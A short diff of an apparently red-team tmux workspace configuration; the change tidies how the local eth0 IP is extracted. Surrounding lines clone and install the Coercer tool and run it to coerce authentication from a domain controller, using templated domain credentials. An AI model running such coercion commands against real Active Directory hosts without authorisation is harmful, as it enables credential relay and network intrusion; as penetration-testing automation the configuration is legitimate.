@@ -117,7 +117,7 @@ windows:
         - Coercer:
           - tmux select-pane -T 'Coercer' -t "authd:coercAuth.2"
           - cd <%= @settings["toolDir"] %>/Coercer || git clone https://github.com/p0dalirius/Coercer.git <%= @settings["toolDir"] %>/Coercer && cd <%= @settings["toolDir"] %>/Coercer && pipenv install
-          - deviceIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
+          - deviceIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+" | awk '{print $1}')
           - pipenv run python3 Coercer.py coerce -l $deviceIP -t $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -v
           - echo "Note eth0 is the default deviceIP used; modify deviceIP as needed"
   - misc: 
